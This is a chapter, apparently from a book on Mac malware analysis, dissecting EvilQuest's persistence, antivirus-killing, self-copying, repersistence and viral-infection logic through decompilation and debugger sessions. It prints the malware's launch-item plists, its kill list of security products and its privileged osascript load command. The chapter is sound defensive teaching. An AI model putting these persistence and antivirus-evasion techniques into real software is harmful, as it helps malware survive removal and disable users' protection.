<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 11: EvilQuest’s Persistence and Core Functionality Analysis</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_243" title="243"/>11</span><br/>
<span class="ChapterTitle">EvilQuest’s Persistence and Core Functionality Analysis</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">Now that we’ve triaged the EvilQuest specimen and thwarted its anti-analysis logic, we can continue our analysis. In this chapter we’ll detail the malware’s methods of persistence, which ensure it is automatically restarted each time an infected system is rebooted. Then we’ll dive into the myriad of capabilities supported by this insidious threat. </p>
<h2 id="h1-501942c11-0001">Persistence</h2>
<p class="BodyFirst">In <span class="xref" itemid="xref_target_Chapter 10">Chapter 10</span> you saw that the malware invokes what is likely a persistence-related function named <code>ei_persistence_main</code>. Let’s take a closer look at this function, which can be found at <code>0x000000010000b880</code>. <a href="#listing11-1" id="listinganchor11-1">Listing 11-1</a> is a simplified decompilation of the function:</p>
<pre><code>int ei_persistence_main(...) {<br/><br/>    if (is_debugging(...) != 0) {<br/><span epub:type="pagebreak" id="Page_244" title="244"/>        exit(1);<br/>    }<br/>    prevent_trace();<br/>    kill_unwanted(...);<br/>    persist_executable(...);<br/>    install_daemon(...);<br/>    install_daemon(...);<br/>    ei_selfretain_main(...);<br/>    ...<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-1">Listing 11-1</a>: <code>ei_persistence_main</code>, decompiled</p>
<p>As you can see, before it persists, the malware invokes the <code>is_debugging</code> and <code>prevent_trace</code> functions, which seek to prevent dynamic analysis via a debugger. We discussed how to thwart these functions in the previous chapter. As they are easy to bypass, they don’t present any real obstacle to our continued analysis. </p>
<p>Next, the malware invokes several functions to kill any processes connected to antivirus or analysis software and then to persist as both a launch agent and launch daemon. Let’s dive into the mechanisms of each of these functions.</p>
<h3 id="h2-501942c11-0001">Killing Unwanted Processes</h3>
<p class="BodyFirst">After the anti-debugging logic, the malware invokes a function named <code>kill_unwanted</code>. This function first enumerates all running processes via a call to one of the malware’s helper functions: <code>get_process_list</code> (<code>0x0000000100007c40</code>). If we decompile this function, we can determine that it makes use of Apple’s <code>sysctl</code> API to retrieve a list of running processes (<a href="#listing11-2" id="listinganchor11-2">Listing 11-2</a>):</p>
<pre><code><span aria-label="annotation1" class="CodeAnnotationHang">1</span> 0x00000001000104d0  dd 0x00000001, 0x0000000e, 0x00000000<br/><br/>get_process_list(void* processList, int* count) <br/>{<br/> <br/> <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> sysctl(0x1000104d0, 0x3, 0x0, &amp;size, 0x0, 0x0); <br/> <br/>   void* buffer = malloc(size); <br/> <br/> <span aria-label="annotation3" class="CodeAnnotationCode2">3</span> sysctl(0x1000104d0, 0x3, &amp;buffer, &amp;size, 0x0, 0x0);</code></pre>
<p class="CodeListingCaption"><a id="listing11-2">Listing 11-2</a>: Process enumeration via the <code>sysctl</code> API</p>
<p>Notice that an array of three items is found at <code>0x00000001000104d0</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. As this array is passed to the <code>sysctl</code> API, this gives us context to map the constants to <code>CTL_KERN</code> (<code>0x1</code>), <code>KERN_PROC</code> (<code>0xe</code>), and <code>KERN_PROC_ALL</code> (<code>0x0</code>). Also notice that when passed to the first invocation of the <code>sysctl</code> API <span aria-label="annotation2" class="CodeAnnotation">2</span>, the <code>size</code> variable will be initialized with the space to store a list of all processes (as the buffer parameter is <code>0x0</code>, or null). The code allocates a buffer for this list and then re-invokes <code>sysctl</code> <span aria-label="annotation3" class="CodeAnnotation">3</span> along with this newly allocated buffer to retrieve the list of all processes. </p>
<p><span epub:type="pagebreak" id="Page_245" title="245"/>Once EvilQuest has obtained a list of running processes, it enumerates over this list to compare each process with an encrypted list of programs that are hardcoded within the malware and stored in a global variable named <code>EI_UNWANTED</code>. Thanks to our injectable decryptor library, we can recover the decrypted list of programs, as shown in <a href="#listing11-3" id="listinganchor11-3">Listing 11-3</a>:</p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES/tmp/deobfuscator.dylib patch</b><b> </b><br/>...<br/>decrypted string (0x10eb6893f): Little Snitch<br/>decrypted string (0x10eb6895f): Kaspersky<br/>decrypted string (0x10eb6897f): Norton<br/>decrypted string (0x10eb68993): Avast<br/>decrypted string (0x10eb689a7): DrWeb<br/>decrypted string (0x10eb689bb): Mcaffee<br/>decrypted string (0x10eb689db): Bitdefender<br/>decrypted string (0x10eb689fb): Bullguard</code></pre>
<p class="CodeListingCaption"><a id="listing11-3">Listing 11-3</a>: EvilQuest’s “unwanted” programs</p>
<p>As you can see, this is a list of common security and antivirus products (albeit some, such as “Mcaffee,” are misspelled) that may inhibit or detect the malware’s actions. </p>
<p>What does EvilQuest do if it finds a process that matches an item on the <code>EI_UNWANTED</code> list? It terminates the process and removes its executable bit (<a href="#listing11-4" id="listinganchor11-4">Listing 11-4</a>).</p>
<pre><code>0x00000001000082fb    mov        rdi, qword [rbp+currentProcess]<br/>0x00000001000082ff    mov        rsi, rax   ;each item from EI_UNWANTED<br/>0x0000000100008302    call       strstr<br/>0x0000000100008307    cmp        rax, 0x0<br/>0x000000010000830b    je         noMatch<br/><br/>0x0000000100008311    mov        edi, dword [rbp+currentProcessPID]<br/>0x0000000100008314    mov        esi, 0x9 <br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> 0x0000000100008319    call       kill <br/>0x000000010000832e    mov        rdi, qword [rbp+currentProcess]<br/>0x0000000100008332    mov        esi, 0x29a <br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> 0x0000000100008337    call       chmod </code></pre>
<p class="CodeListingCaption"><a id="listing11-4">Listing 11-4</a>: Unwanted process termination </p>
<p>If a running process matches an unwanted item, the malware first invokes the <code>kill</code> system call with a <code>SIGKILL</code> (<code>0x9</code>) <span aria-label="annotation1" class="CodeAnnotation">1</span>. Then, to prevent the unwanted process from being executed in the future, it manually removes its executable bit with <code>chmod</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. (The value of <code>0x29a</code>, <code>666</code> decimal, passed to <code>chmod</code> instructs it to remove the executable bit for the owner, the group, and other permissions). </p>
<p>We can observe this in action in a debugger by launching the malware (which, recall, was copied to <em>/Library/mixednkey/toolroomd</em>) and setting a breakpoint on the call to <code>kill</code>, which we find in the disassembly at <code>0x100008319</code>. If we then create a process that matches any of the items <span epub:type="pagebreak" id="Page_246" title="246"/>on the unwanted list, such as “Kaspersky,” our breakpoint will be hit, as shown in <a href="#listing11-5" id="listinganchor11-5">Listing 11-5</a>:</p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/>(lldb) <b>b 0x100008319</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x0000000100008319], address = 0x0000000100008319<br/><br/>(lldb) <b>r</b><br/>...<br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1<br/>-&gt;  0x100008319: callq  0x10000ff2a  ;kill<br/>    0x10000831e: cmpl   $0x0, %eax<br/> <br/>(lldb) <b>reg read $rdi</b><br/>rdi = 0x00000000000005b1 <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>(lldb) <b>reg read $rsi</b><br/>rsi = 0x0000000000000009 <span aria-label="annotation2" class="CodeAnnotationCode">2</span></code></pre>
<p class="CodeListingCaption"><a id="listing11-5">Listing 11-5</a>: Unwanted process termination, observed in a debugger</p>
<p>Dumping the arguments passed to <code>kill</code> reveals EvilQuest indeed sending a <code>SIGKILL</code> (<code>0x9</code>) <span aria-label="annotation2" class="CodeAnnotation">2</span> to our test process named “Kaspersky” (process ID: <code>0x5B1</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>).</p>
<h3 id="h2-501942c11-0002">Making Copies of Itself</h3>
<p class="BodyFirst">Once the malware has killed any programs it deems unwanted, it invokes a function named <code>persist_executable</code> to create a copy of itself in the user’s <em>Library/</em> directory as <em>AppQuest/com.apple.questd</em>. We can observe this passively using FileMonitor (<a href="#listing11-6" id="listinganchor11-6">Listing 11-6</a>):</p>
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter toolroomd</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",<br/>  "file" : {<br/>    "destination" : "/Users/user/Library/AppQuest/com.apple.questd",<br/>    "process" : {<br/>      ...<br/>      "pid" : 1505 <br/>      "name" : "toolroomd",<br/>      "path" : "/Library/mixednkey/toolroomd",<br/>    }<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-6">Listing 11-6</a>: The start of the malware’s copy operation, seen in FileMonitor </p>
<p>If the malware is running as root (which is likely the case, as the installer requested elevated permissions), it will also copy itself to <em/><span epub:type="pagebreak" id="Page_247" title="247"/>/Library/AppQuest/com.apple.questd. Hashing both files confirms they are indeed exact copies of the malware (<a href="#listing11-7" id="listinganchor11-7">Listing 11-7</a>):</p>
<pre><code>% <b>shasum /Library/mixednkey/toolroomd</b><br/>efbb681a61967e6f5a811f8649ec26efe16f50ae<br/><br/>% <b>shasum /Library/AppQuest/com.apple.questd</b><br/>efbb681a61967e6f5a811f8649ec26efe16f50ae<br/><br/>% <b>shasum ~/Library/AppQuest/com.apple.questd</b><br/>efbb681a61967e6f5a811f8649ec26efe16f50ae</code></pre>
<p class="CodeListingCaption"><a id="listing11-7">Listing 11-7</a>: Hashes confirm the copies are identical</p>
<h3 id="h2-501942c11-0003">Persisting the Copies as Launch Items</h3>
<p class="BodyFirst">Once the malware has copied itself, it persists these copies as launch items. The function responsible for this logic is named <code>install_daemon</code> (found at <code>0x0000000100009130</code>), and it is invoked twice: once to create a launch agent and once to create a launch daemon. The latter requires root privileges. </p>
<p>To see this in action, let’s dump the arguments passed to <code>install_daemon</code> the first time it’s called, as shown in <a href="#listing11-8" id="listinganchor11-8">Listing 11-8</a>:</p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb) <b>b 0x0000000100009130</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x0000000100009130], address = 0x0000000100009130<br/><br/>(lldb) <b>c</b><br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1<br/>-&gt;  0x100009130: pushq  %rbp<br/>    0x100009131: movq   %rsp, %rbp<br/><br/>(lldb) <b>x/s $rdi</b><br/>0x7ffeefbffc94: "/Users/user"<br/><br/>(lldb) <b>x/s $rsi</b><br/>0x100114a20: "%s/Library/AppQuest/com.apple.questd"<br/><br/>(lldb) <b>x/s $rdx</b><br/>0x100114740: "%s/Library/LaunchAgents/" </code></pre>
<p class="CodeListingCaption"><a id="listing11-8">Listing 11-8</a>: Parameters passed to the <code>install_daemon</code> function</p>
<p>Using these arguments, the function builds a full path to the malware’s persistent binary (<em>com.apple.questd</em>), as well as to the user’s launch agent directory. To the latter, it then appends a string that decrypts to <em>com.apple.questd.plist</em>. As you’ll see shortly, this is used to persist the malware. </p>
<p><span epub:type="pagebreak" id="Page_248" title="248"/>Next, if we continue the debugging session, we’ll observe a call to the malware’s string decryption function, <code>ei_str</code>. Once this function returns, we find a decrypted template of a launch item property list in the <code>RAX</code> register (<a href="#listing11-9" id="listinganchor11-9">Listing 11-9</a>):</p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb) <b>x/i $rip</b><br/>-&gt; 0x1000091bd: e8 5e 7a ff ff  callq  0x100000c20 ;ei_str<br/><br/>(lldb) <b>ni</b><br/><br/>(lldb) <b>x/s $rax</b><br/>0x100119540: "&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;\n&lt;plist version="1.0"&gt;\n&lt;dict&gt;\n&lt;key&gt;Label&lt;/key&gt;\n&lt;string&gt;%s&lt;/string&gt;\n\n&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;%s&lt;/string&gt;\n&lt;string&gt;--silent&lt;/string&gt;\n&lt;/array&gt;\n\n&lt;key&gt;RunAtLoad&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;key&gt;KeepAlive&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;/dict&gt;\n&lt;/plist&gt;"</code></pre>
<p class="CodeListingCaption"><a id="listing11-9">Listing 11-9</a>: A (decrypted) launch item property list template</p>
<p>After the malware has decrypted the plist template, it configures it with the name “questd” and the full path to its recent copy, <em>/Users/user/Library/AppQuest/com.apple.questd.</em> Now fully configured, the malware writes out the plist using the launch agent path it just created, as seen in <a href="#listing11-10" id="listinganchor11-10">Listing 11-10</a>: </p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"<br/>"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>    &lt;key&gt;Label&lt;/key&gt;<br/>    &lt;string&gt;questd&lt;/string&gt;<br/><br/>    &lt;key&gt;ProgramArguments&lt;/key&gt;<br/>    &lt;array&gt;<br/>        &lt;string&gt;/Users/user/Library/AppQuest/com.apple.questd&lt;/string&gt;<br/>        &lt;string&gt;--silent&lt;/string&gt;<br/>    &lt;/array&gt;<br/><br/>  <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> &lt;key&gt;RunAtLoad&lt;/key&gt;<br/>    &lt;true/&gt;<br/><br/>    &lt;key&gt;KeepAlive&lt;/key&gt;<br/>    &lt;true/&gt;<br/>&lt;/dict&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing11-10">Listing 11-10</a>: The malware’s launch agent plist (<em>~</em><em>/Library/LaunchAgents/com.apple.questd.plist</em>)</p>
<p><span epub:type="pagebreak" id="Page_249" title="249"/>As the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> in the plist, the operating system will automatically restart the specified binary each time the user logs in.</p>
<p>The second time the <code>install_daemon</code> function is invoked, the function follows a similar process. This time, however, it creates a launch daemon instead of a launch agent at <em>/Library/LaunchDaemons/com.apple.questd.plist</em>, and it references the second copy of the malware created in the <em>Library/</em> directory (<a href="#listing11-11" id="listinganchor11-11">Listing 11-11</a>): </p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>    &lt;key&gt;Label&lt;/key&gt;<br/>    &lt;string&gt;questd&lt;/string&gt;<br/><br/>    &lt;key&gt;ProgramArguments&lt;/key&gt;<br/>    &lt;array&gt;<br/>      <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> &lt;string&gt;sudo&lt;/string&gt;<br/>        &lt;string&gt;/Library/AppQuest/com.apple.questd&lt;/string&gt;<br/>        &lt;string&gt;--silent&lt;/string&gt;<br/>    &lt;/array&gt;<br/><br/>  <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> &lt;key&gt;RunAtLoad&lt;/key&gt;<br/>    &lt;true/&gt;<br/><br/>    &lt;key&gt;KeepAlive&lt;/key&gt;<br/>    &lt;true/&gt;<br/><br/>&lt;/dict&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing11-11">Listing 11-11</a>: The malware’s launch daemon plist (<em>/Library/LaunchDaemons/com.apple.questd.plist</em>)</p>
<p>Once again, the <code>RunAtLoad</code> key is set to <code>true</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>, so the system will automatically launch the daemon’s binary every time the system is rebooted. (Note that as launch daemons always run with root privileges, the inclusion of <code>sudo</code> is spurious <span aria-label="annotation1" class="CodeAnnotation">1</span>.) This will mean that on reboot, two instances of the malware will be running: one as a launch daemon and the other as a launch agent (<a href="#listing11-12" id="listinganchor11-12">Listing 11-12</a>):</p>
<pre><code>% <b>ps aux | grep -i com.apple.questd</b><br/>root     97    sudo /Library/AppQuest/com.apple.questd --silent<br/>user     541   /Users/user/Library/AppQuest/com.apple.questd –silent</code></pre>
<p class="CodeListingCaption"><a id="listing11-12">Listing 11-12</a>: The malware, running as both a launch daemon and an agent</p>
<h3 id="h2-501942c11-0004">Starting the Launch Items</h3>
<p class="BodyFirst">Once the malware has ensured that it has persisted twice, it invokes the <code>ei_selfretain_main</code> function to start the launch items. Perusing the <span epub:type="pagebreak" id="Page_250" title="250"/>function’s disassembly, we note two calls to a function named <code>run_daemon</code> (<a href="#listing11-13" id="listinganchor11-13">Listing 11-13</a>):</p>
<pre><code>ei_selfretain_main:<br/>0x000000010000b710    push       rbp<br/>0x000000010000b711    mov        rbp, rsp<br/>...<br/>0x000000010000b7a6    call       run_daemon <br/>...<br/>0x000000010000b7c8    call       run_daemon</code></pre>
<p class="CodeListingCaption"><a id="listing11-13">Listing 11-13</a>: The <code>run_daemon</code> function, invoked twice</p>
<p>Further analysis reveals that this function takes a path component and the name of the launch item to start. For example, the first call (at <code>0x000000010000b7a6</code>) refers to the launch agent. We can confirm this in a debugger by printing out the first two arguments (found in <code>RDI</code> and <code>RSI</code>), as shown in <a href="#listing11-14" id="listinganchor11-14">Listing 11-14</a>: </p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over<br/>-&gt;  0x10000b7a6: callq  run_daemon<br/><br/>(lldb) <b>x/s $rdi</b><br/>0x100212f90: "%s/Library/LaunchAgents/"<br/><br/>(lldb) <b>x/s $rsi</b><br/>0x100217b40: "com.apple.questd.plist"</code></pre>
<p class="CodeListingCaption"><a id="listing11-14">Listing 11-14</a>: Arguments passed to the <code>run_daemon</code> function</p>
<p>The next time the <code>run_daemon</code> function is invoked (at <code>0x000000010000b7c8</code>), it’s invoked with the path components and name to the launch daemon. </p>
<p>Examining the <code>run_daemon</code> function, we see it first invokes a helper function named <code>construct_plist_path</code> with the two path-related arguments (passed to <code>run_daemon</code>). As its name implies, the goal of the <code>construct_plist_path</code> function is to construct a full path to a specified launch item’s plist. <a href="#listing11-15" id="listinganchor11-15">Listing 11-15</a> is a snippet of its disassembly:</p>
<pre><code>construct_plist_path:<br/>0x0000000100002900    push       rbp<br/>0x0000000100002901    mov        rbp, rsp<br/>...<br/>0x0000000100002951    lea        rax, qword [aSs_10001095a]    ; "%s/%s"<br/>0x0000000100002958    mov        qword [rbp+format], rax<br/>...<br/>0x00000001000029a9    xor        esi, esi<br/>0x00000001000029ab    mov        rdx, 0xffffffffffffffff<br/>0x00000001000029b6    mov        rdi, qword [rbp+path]<br/><span epub:type="pagebreak" id="Page_251" title="251"/>0x00000001000029ba    mov        rcx, qword [rbp+format]<br/>0x00000001000029be    mov        r8, qword [rbp+arg_1]<br/>0x00000001000029c2    mov        r9, qword [rbp+arg_2]<br/><br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> 0x00000001000029c8    call       sprintf_chk</code></pre>
<p class="CodeListingCaption"><a id="listing11-15">Listing 11-15</a>: Constructing the path for the launch item’s property list</p>
<p>The function’s core logic simply concatenates the two arguments together with the <code>sprintf_chk</code> function <span aria-label="annotation1" class="CodeAnnotation">1</span>.</p>
<p>Once <code>construct_plist_path</code> returns with a constructed path, the <code>run_daemon</code> function decrypts a lengthy string, which is a template for the command to load, and then starts the specified launch via <code>AppleScript</code>: </p>
<pre><code>osascript -e "do shell script \"launchctl load -w %s;launchctl start %s\" <br/>with administrator privileges"</code></pre>
<p>This templated command is then populated with the path to the launch item (returned from <code>construct_plist_path</code>), as well as the name of the launch item, “questd.” The full command is passed to the <code>system</code> API to be executed. We can observe this using a process monitor (<a href="#listing11-16" id="listinganchor11-16">Listing 11-16</a>): </p>
<pre><code><b># ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",<br/>  "process" : {<br/>    ...<br/>    "id" : 0,<br/>    "arguments" : [<br/>    <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> "osascript", <br/>      "-e",<br/>    <span aria-label="annotation2" class="CodeAnnotationCode2">2</span> "do shell script \"launchctl load -w <br/>       /Library/LaunchDaemons/com.apple.questd.plist<br/>       launchctl start questd\" with administrator privileges"<br/>    ],<br/>    "pid" : 1579,<br/>    "name" : "osascript",<br/>    "path" : "/usr/bin/osascript"<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-16">Listing 11-16</a>: Observing the <code>AppleScript</code> launch of a launch item</p>
<p>As you can see, the call to the <code>run_daemon</code> function executes <code>osascript</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> along with the launch commands, path, and name of the launch item <span aria-label="annotation2" class="CodeAnnotation">2</span>. You might have noticed that there is a subtle bug in the malware’s launch item loading code. Recall that to build the full path to the launch item to be started, the <code>construct_plist_path</code> function concatenates the two provided path components. For the launch agent, this path includes a <code>%s</code>, which should have been populated at runtime with the name of the current user. This never happens. As a result, the concatenation generates an invalid plist path, and the manual loading of the launch agent fails. As the path components to the launch daemon are absolute, no substitution is required, so the <span epub:type="pagebreak" id="Page_252" title="252"/>daemon is successfully launched. MacOS enumerates all installed launch item plists on reboot, so it will find and load both the launch daemon and the launch agent.</p>
<h2 id="h1-501942c11-0002">The Repersistence Logic</h2>
<p class="BodyFirst">It’s common for malware to persist, but EvilQuest takes things a step further by repersisting itself if any of its persistent components are removed. This self-defense mechanism may thwart users or antivirus tools that attempt to disinfect a system upon which EvilQuest has taken root. We first came across this repersistence logic in <span class="xref" itemid="xref_target_Chapter 10">Chapter 10</span>, when we noted that the <em>patch</em> binary didn’t contain any “trailer” data and thus skipped the repersistence-related block of code. Let’s now take a look at how the malware achieves this self-defending repersistence logic. </p>
<p>You’ll locate the start of this logic within the malware’s main function, at <code>0x000000010000c24d</code>, where a new thread is created. The thread’s start routine is a function called <code>ei_pers_thread</code> (“persistence thread”) implemented at <code>0x0000000100009650</code>. Analyzing the disassembly of this function reveals that it creates an array of filepaths and then passes these to a function named <code>set_important_files</code>. Let’s place a breakpoint at the start of the <code>set_important_files</code> function to dump this array of filepaths (<a href="#listing11-17" id="listinganchor11-17">Listing 11-17</a>): </p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb)<b> </b><b>b 0x000000010000d520</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x000000010000D520], address = 0x000000010000D520<br/><br/>(lldb) <b>c</b><br/>...<br/><br/>Process 1397 stopped<br/>* thread #2, stop reason = breakpoint 1.1<br/>-&gt; 0x10000d520: 55        pushq  %rbp<br/>   0x10000d521: 48 89 e5  movq   %rsp, %rbp<br/><br/>(lldb) <b>p ((char**)$rdi)[0]</b><br/>0x0000000100305e60 "/Library/AppQuest/com.apple.questd"<br/>(lldb) <b>p ((char**)$rdi)[1]</b><br/>0x0000000100305e30 "/Users/user/Library/AppQuest/com.apple.questd"<br/>(lldb) <b>p ((char**)$rdi)[2]</b><br/>0x0000000100305ee0 "/Library/LaunchDaemons/com.apple.questd.plist"<br/>(lldb) <b>p ((char**)$rdi)[3]</b><br/>0x0000000100305f30 "/Users/user/Library/LaunchAgents/com.apple.questd.plist"</code></pre>
<p class="CodeListingCaption"><a id="listing11-17">Listing 11-17</a>: “Important” files</p>
<p>As you can see, these filepaths look like the malware’s persistent launch items and their corresponding binaries. Now what does the <code>set_important_files</code> <span epub:type="pagebreak" id="Page_253" title="253"/>function do with these files? First, it opens a kernel queue (via <code>kqueue</code>) and adds these files in order to instruct the system to monitor them. Apple’s documentation on kernel queues states that programs should then call <code>kevent</code> in a loop to monitor for events such as filesystem notifications.<sup class="endnote"><a href="#c11-endnote-1" id="c11-noteref-1">1</a></sup> EvilQuest follows this advice and indeed calls <code>kevent</code> in a loop. The system will now deliver a notification if, for example, one of the watched files is modified or deleted. Normally the code would then take some action, but it appears that in this version of the malware the <code>kqueue</code> logic is incomplete: the malware contains no logic to actually respond to such events. </p>
<p>Despite this omission, EvilQuest will still repersist its components as needed because it invokes the original persistence function multiple times. We can manually delete one of the malware’s persistent components and use a file monitor to observe the malware restoring the file (<a href="#listing11-18" id="listinganchor11-18">Listing 11-18</a>):</p>
<pre><code># <b>rm /Library/LaunchDaemons/com.apple.questd.plist</b><b> </b><br/># <b>ls /Library/LaunchDaemons/com.apple.questd.plist</b><br/>ls: /Library/LaunchDaemons/com.apple.questd.plist: No such file or directory<br/><br/># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter com.apple.questd.plist</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_WRITE", <br/>  "file" : {<br/>    "destination" : "/Library/LaunchDaemons/com.apple.questd.plist",<br/>    "process" : {<br/>      "path" : "/Library/mixednkey/toolroomd",<br/>      "name" : "toolroomd",<br/>      "pid" : 1369<br/>    }<br/>  }<br/>}<br/><br/># <b>ls /Library/LaunchDaemons/com.apple.questd.plist</b><br/><b>/Library/LaunchDaemons/com.apple.questd.plist</b></code></pre>
<p class="CodeListingCaption"><a id="listing11-18">Listing 11-18</a>: Observing repersistence logic </p>
<p>Once the malware has persisted and spawned off a thread to repersist if necessary, it begins executing its core capabilities. This includes viral infection, file exfiltration, remote tasking, and ransomware. Let’s take a look at these now. </p>
<h2 id="h1-501942c11-0003">The Local Viral Infection Logic</h2>
<p class="BodyFirst">In Peter Szor’s seminal book <em>The Art of Computer Virus Research and Defense</em> we find a succinct definition of a computer virus, attributed to Dr. Frederick Cohen: </p>
<blockquote class="review">
<p class="Blockquote">A virus is a program that is able to infect other programs by modifying them to include a possibly evolved copy of itself.<sup class="endnote"><a href="#c11-endnote-2" id="c11-noteref-2">2</a></sup></p></blockquote>
<p>True viruses are quite rare on macOS. Most malware targeting the operating system is self-contained and doesn’t locally replicate once it <span epub:type="pagebreak" id="Page_254" title="254"/>has compromised a system. EvilQuest is an exception. In this section we’ll explore how it is able to virally spread to other programs, making attempts to eradicate it a rather involved endeavor. </p>
<h3 id="h2-501942c11-0005">Listing Candidate Files for Infection </h3>
<p class="BodyFirst">EvilQuest begins its viral infection logic by invoking a function named <code>ei_loader_main</code>. <a href="#listing11-19" id="listinganchor11-19">Listing 11-19</a> shows a relevant snippet of this function:</p>
<pre><code> int _ei_loader_main(...) {<br/>  ...<br/> <br/>  *(args + 0x8) = <span aria-label="annotation1" class="CodeAnnotationCode">1</span> ei_str("26aC391KprmW0000013");<br/><br/>  pthread_create(&amp;threadID, 0x0, <span aria-label="annotation2" class="CodeAnnotationCode">2</span> ei_loader_thread, args);</code></pre>
<p class="CodeListingCaption"><a id="listing11-19">Listing 11-19</a>: Spawning a background thread</p>
<p>First, the <code>ei_loader_main</code> function decrypts a string <span aria-label="annotation1" class="CodeAnnotation">1</span>. Using the decryption techniques discussed in <span class="xref" itemid="xref_target_Chapter 10">Chapter 10</span>, we can recover its plaintext value, <code>"/Users"</code>. The function then spawns a background thread with the start routine set to the <code>ei_loader_thread</code> function <span aria-label="annotation2" class="CodeAnnotation">2</span>. The decrypted string is passed as an argument to this new thread. </p>
<p>Let’s now take a look at the <code>ei_loader_thread</code> function, whose annotated decompilation is shown in <a href="#listing11-20" id="listinganchor11-20">Listing 11-20</a>:</p>
<pre><code>int ei_loader_thread(void* arg0) {<br/>    ...<br/>    result = get_targets(*(arg0 + 0x8), &amp;targets, &amp;count, is_executable); <br/>    if (result == 0x0) {<br/>          for (i = 0x0; i &lt; count; i++) {<br/>               if (append_ei(arg0, targets[i]) == 0x0) {<br/>                     infectedFiles++;<br/>               }<br/>          }<br/>    }<br/><br/>    return infectedFiles;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-20">Listing 11-20</a>: The <code>ei_loader_thread</code> function</p>
<p>First, it invokes a helper function named <code>get_targets</code> with the decrypted string passed in as an argument to the thread function, various output variables, and a callback function named <code>is_executable</code>. </p>
<p>If we examine the <code>get_targets</code> function (found at <code>0x000000010000e0d0</code>), we see that given a root directory (like <em>/Users</em>), the <code>get_targets</code> function invokes the <code>opendir</code> and <code>readdir</code> APIs to recursively generate a list of files. Then, for each file encountered, the callback function (such as <code>is_executable</code>) is invoked. This allows the list of enumerated files to be filtered by some constraint. </p>
<h3 id="h2-501942c11-0006"><span epub:type="pagebreak" id="Page_255" title="255"/>Checking Whether to Infect Each File</h3>
<p class="BodyFirst">The <code>is_executable</code> function performs several checks to select only files from the list that are non-application Mach-O executables smaller than 25MB. If you take a look at <code>is_executable</code>’s annotated disassembly, which you can find starting at <code>0x0000000100004ac0</code>, you’ll see the first check, which confirms that the file isn’t an application (<a href="#listing11-21" id="listinganchor11-21">Listing 11-21</a>): </p>
